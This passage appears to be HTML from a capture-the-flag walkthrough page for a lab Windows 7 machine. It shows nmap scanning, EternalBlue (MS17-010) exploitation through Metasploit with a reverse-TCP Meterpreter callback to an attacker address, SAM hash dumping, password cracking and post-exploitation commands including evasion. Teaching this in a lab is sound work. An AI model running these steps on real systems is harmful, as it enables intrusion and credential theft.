+      <div class="terminal-body">
+<span class="prompt">kali@attacker:~$</span> <span class="cmd">sudo nmap -sC -sV -v3 -p- -Pn -oN blue_scan.nmap 10.10.10.10</span>
+<span class="output">Starting Nmap 7.92 ( https://nmap.org )</span>
+<span class="output">Nmap scan report for 10.10.10.10</span>
+<span class="output">Host is up (0.0012s latency).</span>
+<span class="output">Not shown: 65531 filtered ports</span>
+<span class="highlight">PORT      STATE  SERVICE      VERSION</span>
+<span class="success">135/tcp   open   msrpc        Microsoft Windows RPC</span>
+<span class="success">139/tcp   open   netbios-ssn  Microsoft Windows NetBIOS-SSN</span>
+<span class="success">445/tcp   open   microsoft-ds Microsoft Windows 7 Professional</span>
+<span class="success">3389/tcp  open   rdp          Microsoft RDP</span>
+<span class="output">Service Info: OS: Windows 7; CPE: cpe:/o:microsoft:windows_7</span>
+<span class="highlight">Nmap done: 1 IP address (1 host up) scanned in 127.34 seconds</span>
+      </div>
+    </div>
+    <div class="flags-grid">
+      <div class="flag-item"><code>-sC</code> <span>Default scripts</span></div>
+      <div class="flag-item"><code>-sV</code> <span>Version detection</span></div>
+      <div class="flag-item"><code>-v3</code> <span>Verbose level 3</span></div>
+      <div class="flag-item"><code>-p-</code> <span>All ports</span></div>
+      <div class="flag-item"><code>-Pn</code> <span>Skip host discovery</span></div>
+      <div class="flag-item"><code>-oN</code> <span>Normal output</span></div>
+    </div>
+    <div class="services-grid">
+      <div class="service-item"><span class="service-port">135/tcp</span> <span class="service-name">MSRPC</span></div>
+      <div class="service-item"><span class="service-port">139/tcp</span> <span class="service-name">NetBIOS</span></div>
+      <div class="service-item important"><span class="service-port">445/tcp</span> <span class="service-name">SMB - CRITICAL</span></div>
+      <div class="service-item"><span class="service-port">3389/tcp</span> <span class="service-name">RDP</span></div>
+    </div>
+    <div class="os-badge">Windows 7 Professional SP1 x64 detected</div>
+  </div>
+</section>
+
+<section class="section" id="smb">
+  <div class="section-inner">
+    <div class="section-number">Section 05</div>
+    <h2 class="section-title">Understanding SMB</h2>
+    <p class="section-desc">Server Message Block (SMB) is a network file-sharing protocol used primarily by Windows systems. Understanding SMB is crucial because EternalBlue targets SMBv1, an older version of this protocol.</p>
+    <div class="info-card">
+      <h3>What is SMB?</h3>
+      <p>SMB (Server Message Block) is a protocol used for file sharing, printer sharing, and inter-process communication on Windows networks. It operates on ports 139 (NetBIOS) and 445 (direct SMB). The EternalBlue exploit targets a vulnerability in SMBv1 that allows remote code execution without authentication.</p>
+    </div>
+    <div class="smb-flow">
+      <div class="smb-node"><span>Client</span></div>
+      <div class="smb-arrow">→</div>
+      <div class="smb-node"><span>SMB Service</span></div>
+      <div class="smb-arrow">→</div>
+      <div class="smb-node"><span>File Access</span></div>
+      <div class="smb-arrow">→</div>
+      <div class="smb-node"><span>Authentication</span></div>
+    </div>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">F</div>
+        <div class="card-icon-bg"></div>
+        <h3>File Sharing</h3>
+        <p>SMB enables file sharing across network devices, allowing users to access remote filesystems as if they were local.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">P</div>
+        <div class="card-icon-bg"></div>
+        <h3>Printer Sharing</h3>
+        <p>Network printers are often shared via SMB, creating additional attack surface for lateral movement within a network.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">N</div>
+        <div class="card-icon-bg"></div>
+        <h3>Network Communication</h3>
+        <p>SMB handles inter-process communication between Windows services, making it a critical component of Windows networking.</p>
+      </div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">smb-flow.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="output">[SMB Flow Diagram]</span>
+<span class="output">Client → SMB Negotiation → [Protocol Version Selected]</span>
+<span class="output">Client → Session Setup → [Authentication Required]</span>
+<span class="output">Client → Tree Connect → [Share Access Granted]</span>
+<span class="output">Client → File Operations → [Read/Write/Delete]</span>
+<span class="highlight">SMBv1 is vulnerable to EternalBlue due to buffer overflow in</span>
+<span class="highlight">the handling of crafted SMBv1 packets (CVE-2017-0143).</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="vuln">
+  <div class="section-inner-full">
+    <div class="section-number">Section 06</div>
+    <h2 class="section-title">MS17-010 Vulnerability Analysis</h2>
+    <p class="section-desc">MS17-010 is a critical remote code execution vulnerability in Microsoft's SMBv1 server. EternalBlue is the exploit that weaponizes this vulnerability, allowing attackers to execute arbitrary code on the target system.</p>
+    <div class="vuln-dashboard">
+      <div class="vuln-item"><span class="vuln-label">CVE</span><span class="vuln-value">CVE-2017-0143</span></div>
+      <div class="vuln-item"><span class="vuln-label">Exploit</span><span class="vuln-value">EternalBlue</span></div>
+      <div class="vuln-item"><span class="vuln-label">CVSS</span><span class="vuln-value">9.8</span></div>
+      <div class="vuln-item"><span class="vuln-label">Access</span><span class="vuln-value">Network</span></div>
+      <div class="vuln-item"><span class="vuln-label">Auth</span><span class="vuln-value">None</span></div>
+      <div class="vuln-item"><span class="vuln-label">Impact</span><span class="vuln-value">RCE</span></div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">vuln-scan.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">kali@attacker:~$</span> <span class="cmd">nmap --script smb-vuln-ms17-010 -p445 10.10.10.10</span>
+<span class="output">Nmap scan report for 10.10.10.10</span>
+<span class="output">Host is up (0.0010s latency).</span>
+<span class="output">PORT    STATE SERVICE</span>
+<span class="success">445/tcp open  microsoft-ds</span>
+<span class="output">Host script results:</span>
+<span class="success">| smb-vuln-ms17-010:</span>
+<span class="success">|   VULNERABLE:</span>
+<span class="success">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (MS17-010)</span>
+<span class="success">|     State: VULNERABLE</span>
+<span class="success">|     IDs:  CVE-2017-0143</span>
+<span class="success">|     Risk factor: HIGH</span>
+<span class="success">|     Info: SMBv1 is enabled and the target is vulnerable to EternalBlue</span>
+<span class="output">|_      https://technet.microsoft.com/en-us/library/security/MS17-010</span>
+      </div>
+    </div>
+    <div class="info-card">
+      <h3>How EternalBlue Works</h3>
+      <div class="exploit-steps">
+        <div class="exploit-step"><span class="step-num">1</span><span class="step-text">Attacker sends a crafted SMBv1 packet to the target on port 445</span></div>
+        <div class="exploit-step"><span class="step-num">2</span><span class="step-text">The packet triggers a buffer overflow in the SMBv1 driver (srv.sys)</span></div>
+        <div class="exploit-step"><span class="step-num">3</span><span class="step-text">Shellcode is injected into kernel memory space</span></div>
+        <div class="exploit-step"><span class="step-num">4</span><span class="step-text">The shellcode executes with SYSTEM privileges bypassing security controls</span></div>
+        <div class="exploit-step"><span class="step-num">5</span><span class="step-text">A reverse shell or Meterpreter payload is delivered to the attacker</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="real-world">
+  <div class="section-inner">
+    <div class="section-number">Section 07</div>
+    <h2 class="section-title">EternalBlue in the Real World</h2>
+    <p class="section-desc">The EternalBlue exploit was infamously used in several major global ransomware attacks, causing billions of dollars in damages and affecting hundreds of thousands of systems worldwide.</p>
+    <div class="timeline">
+      <div class="timeline-item">
+        <div class="timeline-date">2017</div>
+        <div class="timeline-content">
+          <h3>WannaCry Ransomware</h3>
+          <p>EternalBlue was used to spread the WannaCry ransomware globally in May 2017. The attack affected over 200,000 computers across 150 countries, causing an estimated $4 billion in damages. Major organizations including the UK National Health Service (NHS) were crippled.</p>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">2017</div>
+        <div class="timeline-content">
+          <h3>NotPetya Attack</h3>
+          <p>In June 2017, the NotPetya attack used EternalBlue alongside other exploits to spread rapidly across networks. Originally targeting Ukraine, it spread globally causing over $10 billion in damages and affecting companies like Maersk, Merck, and FedEx.</p>
+        </div>
+      </div>
+      <div class="timeline-item">
+        <div class="timeline-date">2017</div>
+        <div class="timeline-content">
+          <h3>BadRabbit Campaign</h3>
+          <p>In October 2017, the BadRabbit ransomware campaign also utilized EternalBlue for propagation. While less widespread than WannaCry, it demonstrated that the exploit remained a persistent threat months after the patch was released.</p>
+        </div>
+      </div>
+    </div>
+    <div class="cards-grid">
+      <div class="card card-accent card-accent-red reveal">
+        <div class="card-icon">$</div>
+        <div class="card-icon-bg"></div>
+        <h3>Financial Impact</h3>
+        <p>Combined damages from EternalBlue-based attacks exceeded $10 billion, affecting critical infrastructure, healthcare, and enterprise systems globally.</p>
+      </div>
+      <div class="card card-accent card-accent-red reveal">
+        <div class="card-icon">H</div>
+        <div class="card-icon-bg"></div>
+        <h3>Healthcare Crippled</h3>
+        <p>Hospitals and healthcare systems were forced to cancel surgeries and divert emergency patients, highlighting the real-world consequences of unpatched systems.</p>
+      </div>
+      <div class="card card-accent card-accent-red reveal">
+        <div class="card-icon">G</div>
+        <div class="card-icon-bg"></div>
+        <h3>Global Propagation</h3>
+        <p>The self-propagating nature of EternalBlue allowed attacks to spread across the internet in minutes without any user interaction, making containment extremely difficult.</p>
+      </div>
+    </div>
+    <div class="quote-block">
+      <div class="quote-text">"The Shadow Brokers' release of EternalBlue was the cyber equivalent of a nuclear bomb being detonated. It fundamentally changed the threat landscape overnight."</div>
+      <div class="quote-author">— Cybersecurity Expert Analysis, 2017</div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="metasploit">
+  <div class="section-inner">
+    <div class="section-number">Section 08</div>
+    <h2 class="section-title">Metasploit Exploitation</h2>
+    <p class="section-desc">Metasploit Framework provides a comprehensive exploit module for EternalBlue. We search for and configure the appropriate module to target the vulnerable SMB service.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">msfconsole.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">kali@attacker:~$</span> <span class="cmd">msfconsole</span>
+<span class="output">Metasploit Framework v6.2.23</span>
+<span class="prompt">msf6 ></span> <span class="cmd">search eternalblue</span>
+<span class="output">Matching Modules</span>
+<span class="output">================</span>
+<span class="highlight">#  Name                                        Disclosure Date  Rank    Check  Description</span>
+<span class="highlight">0  exploit/windows/smb/ms17_010_eternalblue   2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span>
+<span class="prompt">msf6 ></span> <span class="cmd">use exploit/windows/smb/ms17_010_eternalblue</span>
+<span class="success">[*] Using configured payload windows/x64/meterpreter/reverse_tcp</span>
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="payload">
+  <div class="section-inner">
+    <div class="section-number">Section 09</div>
+    <h2 class="section-title">Payload Configuration</h2>
+    <p class="section-desc">Proper payload configuration is critical for successful exploitation. We set the target, configure the reverse TCP payload, and specify the listener host.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">payload-config.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">set RHOSTS 10.10.10.10</span>
+<span class="success">RHOSTS => 10.10.10.10</span>
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span>
+<span class="success">PAYLOAD => windows/x64/meterpreter/reverse_tcp</span>
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">set LHOST 10.10.14.20</span>
+<span class="success">LHOST => 10.10.14.20</span>
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">show options</span>
+<span class="output">Module options (exploit/windows/smb/ms17_010_eternalblue):</span>
+<span class="output">   Name     Current Setting  Required  Description</span>
+<span class="output">   ----     ---------------  --------  -----------</span>
+<span class="highlight">   RHOSTS   10.10.10.10      yes       Target address</span>
+<span class="output">Payload options (windows/x64/meterpreter/reverse_tcp):</span>
+<span class="output">   Name   Current Setting  Required  Description</span>
+<span class="output">   ----   ---------------  --------  -----------</span>
+<span class="highlight">   LHOST  10.10.14.20      yes       Local listener address</span>
+      </div>
+    </div>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">R</div>
+        <div class="card-icon-bg"></div>
+        <h3>RHOSTS</h3>
+        <p>Sets the remote target IP address. In this case, 10.10.10.10 is the Blue machine target we are attacking.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">T</div>
+        <div class="card-icon-bg"></div>
+        <h3>Reverse TCP</h3>
+        <p>Configures a reverse TCP Meterpreter payload that connects back to the attacker's machine from the compromised target.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">L</div>
+        <div class="card-icon-bg"></div>
+        <h3>LHOST</h3>
+        <p>Specifies the attacker's IP address where the Meterpreter listener will be waiting for the reverse connection.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="verify">
+  <div class="section-inner">
+    <div class="section-number">Section 10</div>
+    <h2 class="section-title">Vulnerability Verification</h2>
+    <p class="section-desc">Before running the exploit, we verify the target is indeed vulnerable using Metasploit's built-in check functionality.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">vuln-check.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">check</span>
+<span class="output">[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span>
+<span class="output">[*] 10.10.10.10:445   - Host could be exploited, but accurate check is not available.</span>
+<span class="output">[*] 10.10.10.10:445   - SMBv1 is enabled on the target.</span>
+<span class="success">[+] 10.10.10.10:445   - The target is vulnerable.</span>
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">run</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="exploit-phase">
+  <div class="section-inner">
+    <div class="section-number">Section 11</div>
+    <h2 class="section-title">Exploitation Phase</h2>
+    <p class="section-desc">Executing the EternalBlue exploit against the vulnerable target. The exploit triggers a kernel-level buffer overflow in the SMBv1 driver to gain remote code execution.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">exploit.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">msf6 exploit(ms17_010_eternalblue) ></span> <span class="cmd">run</span>
+<span class="output">[*] Started reverse TCP handler on 10.10.14.20:4444</span>
+<span class="output">[*] 10.10.10.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span>
+<span class="success">[+] 10.10.10.10:445 - Target is vulnerable to MS17-010!</span>
+<span class="output">[*] 10.10.10.10:445 - Exploiting...</span>
+<span class="output">[*] 10.10.10.10:445 - Sending exploit packet...</span>
+<span class="highlight">[+] 10.10.10.10:445 - Exploit completed successfully!</span>
+<span class="success">[*] Sending stage (200262 bytes) to 10.10.10.10</span>
+<span class="success">[*] Meterpreter session 1 opened (10.10.14.20:4444 -> 10.10.10.10:49158)</span>
+<span class="highlight">meterpreter ></span>
+      </div>
+    </div>
+    <div class="exploit-steps-container">
+      <div class="exploit-step-card">
+        <div class="step-number">1</div>
+        <div class="step-content">
+          <h4>Target Connection</h4>
+          <p>Metasploit establishes a TCP connection to the target on port 445 and begins the SMB protocol negotiation.</p>
+        </div>
+      </div>
+      <div class="exploit-step-card">
+        <div class="step-number">2</div>
+        <div class="step-content">
+          <h4>Vulnerability Check</h4>
+          <p>The module probes the SMB service to confirm MS17-010 is present and the target is exploitable.</p>
+        </div>
+      </div>
+      <div class="exploit-step-card">
+        <div class="step-number">3</div>
+        <div class="step-content">
+          <h4>Buffer Overflow Trigger</h4>
+          <p>A crafted SMBv1 packet is sent to trigger a buffer overflow in the srv.sys kernel driver.</p>
+        </div>
+      </div>
+      <div class="exploit-step-card">
+        <div class="step-number">4</div>
+        <div class="step-content">
+          <h4>Shellcode Execution</h4>
+          <p>The exploit shellcode executes with SYSTEM privileges in kernel context, disabling security controls.</p>
+        </div>
+      </div>
+      <div class="exploit-step-card">
+        <div class="step-number">5</div>
+        <div class="step-content">
+          <h4>Meterpreter Session</h4>
+          <p>A reverse Meterpreter payload connects back to the attacker machine, providing complete remote access.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="meterpreter">
+  <div class="section-inner">
+    <div class="section-number">Section 12</div>
+    <h2 class="section-title">Meterpreter Access</h2>
+    <p class="section-desc">With the Meterpreter session established, we can now interact with the compromised system. We begin by gathering system information and verifying our privilege level.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">meterpreter-session.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="highlight">meterpreter ></span> <span class="cmd">sysinfo</span>
+<span class="output">Computer        : BLUE-PC</span>
+<span class="output">OS              : Windows 7 Professional SP1 (x64)</span>
+<span class="output">Architecture    : x64</span>
+<span class="output">System Language : en_US</span>
+<span class="output">Meterpreter     : x64/windows</span>
+<span class="output">Domain          : WORKGROUP</span>
+<span class="highlight">meterpreter ></span> <span class="cmd">getuid</span>
+<span class="success">Server username: NT AUTHORITY\SYSTEM</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="privilege">
+  <div class="section-inner">
+    <div class="section-number">Section 13</div>
+    <h2 class="section-title">SYSTEM Privilege Understanding</h2>
+    <p class="section-desc">SYSTEM is the highest privilege level on Windows, equivalent to root on Linux. Understanding privilege levels is crucial for comprehending the full impact of EternalBlue exploitation.</p>
+    <div class="privilege-hierarchy">
+      <div class="priv-level priv-user"><span>User</span><span class="priv-desc">Limited access</span></div>
+      <div class="priv-arrow">↑</div>
+      <div class="priv-level priv-admin"><span>Admin</span><span class="priv-desc">Elevated access</span></div>
+      <div class="priv-arrow">↑</div>
+      <div class="priv-level priv-system"><span>SYSTEM</span><span class="priv-desc">Complete control</span></div>
+    </div>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">U</div>
+        <div class="card-icon-bg"></div>
+        <h3>Unrestricted Access</h3>
+        <p>SYSTEM privileges provide unrestricted access to all files, processes, and registry keys on the Windows operating system without any security restrictions.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">K</div>
+        <div class="card-icon-bg"></div>
+        <h3>Kernel-Level Control</h3>
+        <p>SYSTEM operates at the kernel level, allowing interaction with hardware drivers, system calls, and low-level operating system functions that are inaccessible to standard users.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">P</div>
+        <div class="card-icon-bg"></div>
+        <h3>Persistence & Evasion</h3>
+        <p>With SYSTEM privileges, attackers can install persistent backdoors, disable security software, and hide their presence from standard detection mechanisms.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="upgrade">
+  <div class="section-inner">
+    <div class="section-number">Section 14</div>
+    <h2 class="section-title">Shell Upgrade</h2>
+    <p class="section-desc">While Meterpreter provides extensive functionality, upgrading to a more stable shell session can be useful for certain post-exploitation tasks and manual system interaction.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">shell-upgrade.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="highlight">meterpreter ></span> <span class="cmd">shell</span>
+<span class="output">Process 1234 created.</span>
+<span class="output">Channel 1 created.</span>
+<span class="highlight">Microsoft Windows [Version 6.1.7601]</span>
+<span class="output">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span>
+<span class="prompt">C:\Windows\system32></span> <span class="cmd">whoami</span>
+<span class="success">nt authority\system</span>
+<span class="prompt">C:\Windows\system32></span> <span class="cmd">exit</span>
+<span class="highlight">meterpreter ></span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="commands">
+  <div class="section-inner">
+    <div class="section-number">Section 15</div>
+    <h2 class="section-title">Meterpreter Command Center</h2>
+    <p class="section-desc">Click any command below to see its output in an interactive Meterpreter simulation. These commands are essential for post-exploitation and system enumeration.</p>
+    <div class="cmd-cards-grid">
+      <div class="cmd-card" data-detail="Displays comprehensive system information including OS version, architecture, and computer name.">
+        <span class="cmd-card-name">sysinfo</span>
+        <span class="cmd-card-desc">System Information</span>
+      </div>
+      <div class="cmd-card" data-detail="Shows the current user context. If SYSTEM is displayed, you have the highest privileges on the Windows machine.">
+        <span class="cmd-card-name">getuid</span>
+        <span class="cmd-card-desc">User Identification</span>
+      </div>
+      <div class="cmd-card" data-detail="Lists all running processes with their PIDs, architecture, and associated user context.">
+        <span class="cmd-card-name">ps</span>
+        <span class="cmd-card-desc">Process List</span>
+      </div>
+      <div class="cmd-card" data-detail="Extracts password hashes from the SAM database. Requires SYSTEM privileges to execute successfully.">
+        <span class="cmd-card-name">hashdump</span>
+        <span class="cmd-card-desc">Dump Hashes</span>
+      </div>
+      <div class="cmd-card" data-detail="Opens a native Windows command shell (cmd.exe) for manual system interaction.">
+        <span class="cmd-card-name">shell</span>
+        <span class="cmd-card-desc">System Shell</span>
+      </div>
+      <div class="cmd-card" data-detail="Uploads files from the attacker machine to the compromised target system.">
+        <span class="cmd-card-name">upload</span>
+        <span class="cmd-card-desc">File Upload</span>
+      </div>
+      <div class="cmd-card" data-detail="Downloads files from the compromised target to the attacker machine for offline analysis.">
+        <span class="cmd-card-name">download</span>
+        <span class="cmd-card-desc">File Download</span>
+      </div>
+      <div class="cmd-card" data-detail="Captures a screenshot of the target's current desktop and saves it locally.">
+        <span class="cmd-card-name">screenshare</span>
+        <span class="cmd-card-desc">Screen Capture</span>
+      </div>
+      <div class="cmd-card" data-detail="Lists available webcams on the target system for potential surveillance.">
+        <span class="cmd-card-name">webcam_list</span>
+        <span class="cmd-card-desc">Webcam List</span>
+      </div>
+      <div class="cmd-card" data-detail="Migrates Meterpreter to a different target process to evade detection or gain specific privileges.">
+        <span class="cmd-card-name">migrate</span>
+        <span class="cmd-card-desc">Process Migration</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="creds">
+  <div class="section-inner">
+    <div class="section-number">Section 16</div>
+    <h2 class="section-title">Credential Dumping</h2>
+    <p class="section-desc">Extracting password hashes from the Security Account Manager (SAM) database is a critical post-exploitation step. These hashes can be cracked offline to recover plaintext passwords.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">hashdump.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="highlight">meterpreter ></span> <span class="cmd">hashdump</span>
+<span class="output">[-] priv_passwd_get_sam_hashes: NTLM hashes were retrieved via SERVICE.</span>
+<span class="output">Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="output">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="output">Jon:1000:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::</span>
+<span class="highlight">[+] Hashdump completed. 3 hashes extracted.</span>
+      </div>
+    </div>
+    <div class="hash-explain">
+      <div class="hash-box">
+        <span class="hash-label">NTLM Hash</span>
+        <span class="hash-detail">Windows authentication hash format</span>
+      </div>
+      <div class="hash-box">
+        <span class="hash-label">LM Hash</span>
+        <span class="hash-detail">Legacy hash (always aad3b...)</span>
+      </div>
+      <div class="hash-box">
+        <span class="hash-label">RID</span>
+        <span class="hash-detail">Relative Identifier (500=Admin)</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="crack">
+  <div class="section-inner">
+    <div class="section-number">Section 17</div>
+    <h2 class="section-title">Password Cracking</h2>
+    <p class="section-desc">John the Ripper is used to crack the extracted NTLM hashes. Weak passwords can be recovered quickly, highlighting the importance of strong password policies.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">john-crack.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="prompt">kali@attacker:~$</span> <span class="cmd">john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span>
+<span class="output">Using default input encoding: UTF-8</span>
+<span class="output">Loaded 3 password hashes with 3 different salts (NT [MD4 256/256 AVX2 8x3])</span>
+<span class="output">Press 'q' or Ctrl-C to abort, almost any other key for status</span>
+<span class="success">password         (Jon)</span>
+<span class="output">1g 0:00:00:00 DONE (2024-01-01 12:00) 1.234g/s 12345p/s 12345c/s 12345C/s</span>
+<span class="output">Use the "--show" option to display all of the cracked passwords reliably</span>
+<span class="highlight">[+] Password for user Jon recovered: password</span>
+      </div>
+    </div>
+    <div class="crack-animation">
+      <div class="crack-step"><span>Hash</span></div>
+      <div class="crack-arrow">→</div>
+      <div class="crack-step"><span>Engine</span></div>
+      <div class="crack-arrow">→</div>
+      <div class="crack-step"><span>Password</span></div>
+    </div>
+    <div class="info-card lesson-card">
+      <h3>Security Lesson</h3>
+      <p>Password cracking success demonstrates the critical importance of using strong, complex passwords. The user 'Jon' had a weak password ("password") that was cracked instantly. Organizations must enforce password complexity requirements and implement multi-factor authentication to mitigate credential theft risks.</p>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="filesystem">
+  <div class="section-inner">
+    <div class="section-number">Section 18</div>
+    <h2 class="section-title">Windows File System Enumeration</h2>
+    <p class="section-desc">Exploring the Windows filesystem reveals flags, configuration files, and sensitive data. Understanding Windows directory structure is essential for effective post-exploitation.</p>
+    <div class="file-tree">
+      <div class="tree-node tree-root">C:\</div>
+      <div class="tree-node tree-dir">├── Users</div>
+      <div class="tree-node tree-dir">│   ├── Administrator</div>
+      <div class="tree-node tree-file">│   │   └── Desktop\flag3.txt</div>
+      <div class="tree-node tree-dir">│   ├── Jon</div>
+      <div class="tree-node tree-file">│   │   └── Desktop\flag1.txt</div>
+      <div class="tree-node tree-dir">│   └── Public</div>
+      <div class="tree-node tree-dir">├── Windows</div>
+      <div class="tree-node tree-dir">│   └── System32</div>
+      <div class="tree-node tree-dir">│       └── config</div>
+      <div class="tree-node tree-file">│           ├── SAM</div>
+      <div class="tree-node tree-file">│           ├── SYSTEM</div>
+      <div class="tree-node tree-file">│           └── flag2.txt</div>
+      <div class="tree-node tree-file">└── flag.txt</div>
+    </div>
+    <div class="cards-grid">
+      <div class="card reveal">
+        <div class="card-icon">F</div>
+        <div class="card-icon-bg"></div>
+        <h3>User Desktop</h3>
+        <p>User-specific files and flags are typically stored on the Desktop, Documents, or AppData directories under each user profile.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">S</div>
+        <div class="card-icon-bg"></div>
+        <h3>System Config</h3>
+        <p>Windows System32 directory contains critical system files including the SAM database where password hashes are stored.</p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon">R</div>
+        <div class="card-icon-bg"></div>
+        <h3>Root Directory</h3>
+        <p>The C:\ root often contains flags and important system files. Always check root directories during post-exploitation.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="flags">
+  <div class="section-inner">
+    <div class="section-number">Section 19</div>
+    <h2 class="section-title">Flag Discovery Methodology</h2>
+    <p class="section-desc">Systematic searching for flags and sensitive files is a crucial post-exploitation skill. Using Meterpreter's search functionality and understanding common file locations accelerates the discovery process.</p>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">flag-search.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="highlight">meterpreter ></span> <span class="cmd">search -f flag*</span>
+<span class="output">Found 4 results...</span>
+<span class="success">    C:\flag.txt (12 bytes)</span>
+<span class="success">    C:\Users\Jon\Desktop\flag1.txt (24 bytes)</span>
+<span class="success">    C:\Users\Administrator\Desktop\flag3.txt (28 bytes)</span>
+<span class="success">    C:\Windows\System32\config\flag2.txt (32 bytes)</span>
+<span class="highlight">[+] 4 flag files located on the target system.</span>
+      </div>
+    </div>
+    <div class="mind-map">
+      <div class="map-node">
+        <div class="map-question">Where are flags stored?</div>
+        <div class="map-answer">User desktops, system directories, and root of C:\</div>
+      </div>
+      <div class="map-node">
+        <div class="map-question">How to search efficiently?</div>
+        <div class="map-answer">Use search -f flag* in Meterpreter</div>
+      </div>
+      <div class="map-node">
+        <div class="map-question">What privileges needed?</div>
+        <div class="map-answer">SYSTEM for full filesystem access</div>
+      </div>
+      <div class="map-node">
+        <div class="map-question">Why multiple locations?</div>
+        <div class="map-answer">Redundancy and different user contexts</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="mindset">
+  <div class="section-inner">
+    <div class="section-number">Section 20</div>
+    <h2 class="section-title">Real Attacker Mindset</h2>
+    <p class="section-desc">Understanding how attackers think helps defenders build better security. Each phase of the attack chain requires specific knowledge, tools, and persistence.</p>
+    <div class="mind-map">
